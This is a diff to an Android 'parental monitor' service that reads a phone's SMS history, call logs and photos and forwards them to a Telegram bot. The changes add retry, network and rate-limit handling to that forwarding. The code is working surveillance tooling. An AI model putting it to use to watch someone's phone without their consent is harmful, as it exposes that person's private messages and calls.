@@ -170,6 +170,8 @@ class MonitoringService : Service() {
     private val initialSyncRunning = java.util.concurrent.atomic.AtomicBoolean(false)
     private val initialSyncLock = Any()
     @Volatile
+    private var initialSyncRetryAt = 0L
+    @Volatile
     private var cachedBotToken = ""
     @Volatile
     private var cachedChatId = ""
@@ -689,6 +691,11 @@ class MonitoringService : Service() {
                     if (!cachedMonitoringPaused) {
                         val dataAuthBlocked = try { NetworkUtils.isAuthBlocked(preferencesManager) } catch (_: Exception) { false }
                         if (checkAndSendNewData()) idleDataCycles = 0 else if (!dataAuthBlocked) idleDataCycles = (idleDataCycles + 1).coerceAtMost(3)
+                        val initialRetryAt = initialSyncRetryAt
+                        if (initialRetryAt > 0L && !initialSyncRunning.get() && hasNetwork() && android.os.SystemClock.elapsedRealtime() >= initialRetryAt) {
+                            initialSyncRetryAt = 0L
+                            startInitialSync(force = false)
+                        }
                         try {
                             CrashReporter.flushPending(this@MonitoringService)
                         } catch (_: Exception) {
@@ -2915,11 +2922,15 @@ class MonitoringService : Service() {
             if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Collecting SMS history...")
             val entrySmsId = try { preferencesManager.lastSmsId } catch (_: Exception) { 0L }
             val pendingSms = mutableListOf<com.redeye.parentalmonitor.data.models.SmsData>()
+            var smsReadFailed = false
             var smsCursor = entrySmsId
             var smsPages = 0
             var smsLastFull = false
             while (smsPages < 5) {
-                val page = try { smsRepository.getNewSms(smsCursor) } catch (_: Exception) { emptyList() }
+                val page = try { smsRepository.getNewSms(smsCursor) } catch (_: Exception) {
+                    smsReadFailed = true
+                    emptyList()
+                }
                 if (page.isEmpty()) break
                 pendingSms.addAll(page)
                 smsCursor = page.maxOf { it.id }
@@ -2939,12 +2950,16 @@ class MonitoringService : Service() {
             val entryCallTs = try { preferencesManager.lastCallTimestamp } catch (_: Exception) { 0L }
             val entryCallId = try { preferencesManager.lastCallId } catch (_: Exception) { 0L }
             val pendingCalls = mutableListOf<com.redeye.parentalmonitor.data.models.CallData>()
+            var callReadFailed = false
             var callTs = entryCallTs
             var callId = entryCallId
             var callPages = 0
             var callLastFull = false
             while (callPages < 5) {
-                val page = try { callLogRepository.getNewCalls(callTs, callId) } catch (_: Exception) { emptyList() }
+                val page = try { callLogRepository.getNewCalls(callTs, callId) } catch (_: Exception) {
+                    callReadFailed = true
+                    emptyList()
+                }
                 if (page.isEmpty()) break
                 pendingCalls.addAll(page)
                 val latest = page.maxWith(compareBy({ it.date }, { it.id }))
@@ -2961,6 +2976,11 @@ class MonitoringService : Service() {
             }
             pendingCalls.sortWith(compareBy({ it.date }, { it.id }))
             if (pendingSms.isEmpty() && pendingCalls.isEmpty()) {
+                if (smsReadFailed || callReadFailed) {
+                    initialSyncRetryAt = android.os.SystemClock.elapsedRealtime() + 30 * 60_000L
+                    android.util.Log.w("MonitoringService", "Sinkron awal ditunda: riwayat SMS/panggilan tak bisa dibaca")
+                    return
+                }
                 val wasDone = try { preferencesManager.initialSyncDone } catch (_: Exception) { true }
                 preferencesManager.setInitialSyncDoneSync(true)
                 if (!wasDone) sendToTelegram("Monitoring jalan. Belum ada riwayat SMS/panggilan di HP ini.")
@@ -2998,7 +3018,7 @@ class MonitoringService : Service() {
                             appendLine("━━━━━━━━━━━━━━━━")
                         }
                     }
-                    val sentSmsPart = sendFitted(message)
+                    val sentSmsPart = sendFitted(message, queueOnFail = false)
                     if (!sentSmsPart) {
                         initialOk = false
                         break
@@ -3030,7 +3050,7 @@ class MonitoringService : Service() {
                             appendLine("━━━━━━━━━━━━━━━━")
                         }
                     }
-                    val sentCallPart = sendFitted(message)
+                    val sentCallPart = sendFitted(message, queueOnFail = false)
                     if (!sentCallPart) {
                         initialOk = false
                         break
@@ -3074,8 +3094,10 @@ class MonitoringService : Service() {
             }
             if (initialOk && !smsTruncated && !callTruncated) {
                 sendToTelegram(completeMessage)
+                initialSyncRetryAt = 0L
                 preferencesManager.setInitialSyncDoneSync(true)
             } else {
+                initialSyncRetryAt = android.os.SystemClock.elapsedRealtime() + 30 * 60_000L
                 sendToTelegram("Sinkron riwayat terkirim sebagian. Sisanya menyusul otomatis.")
             }
             idleDataCycles = 0
@@ -3091,6 +3113,8 @@ class MonitoringService : Service() {
     private suspend fun checkAndSendNewData(): Boolean {
         if (initialSyncRunning.get()) return false
         if (NetworkUtils.isAuthBlocked(preferencesManager)) return false
+        if (!hasNetwork()) return false
+        if (NetworkUtils.rateLimitedRemainMs() > 0L) return false
         var found = false
         try {
             try { checkPermissionHealth() } catch (_: Exception) { }
@@ -3106,7 +3130,7 @@ class MonitoringService : Service() {
                 val freqMap = try { batchFreqMap() } catch (_: Exception) { null }
                 val knownMap = try { smsPage.map { it.address }.distinct().associateWith { isKnownContact(it) } } catch (_: Exception) { null }
                 for (part in smsPage.chunked(10)) {
-                    val sentSms = sendFitted(formatSmsMessage(part, freqMap, knownMap))
+                    val sentSms = sendFitted(formatSmsMessage(part, freqMap, knownMap), queueOnFail = false)
                     if (sentSms) {
                         smsCursor = maxOf(smsCursor, part.maxOf { it.id })
                         try { preferencesManager.setSmsCursorSync(smsCursor) } catch (_: Exception) { }
@@ -3136,7 +3160,7 @@ class MonitoringService : Service() {
                 var callSentAny = false
                 val callKnown = try { callPage.map { it.number }.distinct().associateWith { isKnownContact(it) } } catch (_: Exception) { null }
                 for (part in callPage.chunked(10)) {
-                    val sentCall = sendFitted(formatCallMessage(part, callKnown))
+                    val sentCall = sendFitted(formatCallMessage(part, callKnown), queueOnFail = false)
                     if (!sentCall) {
                         break
                     }
@@ -3743,6 +3767,7 @@ class MonitoringService : Service() {
                             return true
                         } else if (fallbackResp.code() == 429) {
                             val retryAfter = NetworkUtils.parseRetryAfter(try { fallbackResp.errorBody()?.string() } catch (_: Exception) { null })
+                            NetworkUtils.noteRateLimited(retryAfter)
                             if (queueOnFail) {
                                 messageQueue.addMessage(plain)
                                 MessageScheduler.scheduleMessageSendNext(this, retryAfter * 1000L)
@@ -5222,17 +5247,20 @@ class MonitoringService : Service() {
             }
             return
         }
-        if (pendingPhotoCount() >= MAX_PHOTO_KEPT) {
+        val photosBefore = pendingPhotoCount()
+        if (photosBefore >= MAX_PHOTO_KEPT) {
             try {
                 prunePhotoCache(MAX_PHOTO_KEPT - 1)
             } catch (_: Exception) {
             }
-            if (pendingPhotoCount() >= MAX_PHOTO_KEPT) {
+            val photosAfter = pendingPhotoCount()
+            if (photosAfter >= MAX_PHOTO_KEPT) {
                 serviceScope.launch {
                     if (reportResult) {
-                        sendToTelegram("⚠️ Antrean foto penuh (offline). Yang paling lama yang belum terkirim dibuang; foto baru dilewati.")
-                    } else {
-                        sendToTelegram("⚠️ Antrean foto penuh (offline). Foto baru dilewati sampai antrean terkirim.")
+                        sendToTelegram(
+                            if (photosAfter < photosBefore) "⚠️ Antrean foto penuh (offline). Yang paling lama yang belum terkirim dibuang; foto baru dilewati."
+                            else "⚠️ Antrean foto penuh (offline). Foto baru dilewati sampai antrean terkirim."
+                        )
                     }
                 }
                 return
